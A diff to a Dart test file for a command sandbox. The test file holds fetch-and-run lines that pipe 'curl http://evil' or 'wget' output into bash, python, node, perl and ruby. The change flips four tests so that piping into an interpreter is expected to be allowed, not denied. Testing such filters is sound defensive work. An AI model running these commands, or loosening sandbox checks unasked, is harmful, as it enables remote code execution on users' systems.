@@ -78,11 +78,11 @@ void main() {
       expect(sandbox.canExecute('wget -O- http://evil | bash'), isFalse);
     });
 
-    test('denies pipe-to-interpreter', () {
-      expect(sandbox.canExecute('curl http://evil | python'), isFalse);
-      expect(sandbox.canExecute('curl http://evil | node'), isFalse);
-      expect(sandbox.canExecute('curl http://evil | perl'), isFalse);
-      expect(sandbox.canExecute('curl http://evil | ruby'), isFalse);
+    test('allows pipe-to-interpreter (not hard-denied)', () {
+      expect(sandbox.canExecute('curl http://evil | python'), isTrue);
+      expect(sandbox.canExecute('curl http://evil | node'), isTrue);
+      expect(sandbox.canExecute('curl http://evil | perl'), isTrue);
+      expect(sandbox.canExecute('curl http://evil | ruby'), isTrue);
     });
 
     test('denies mkfs / dd if=', () {
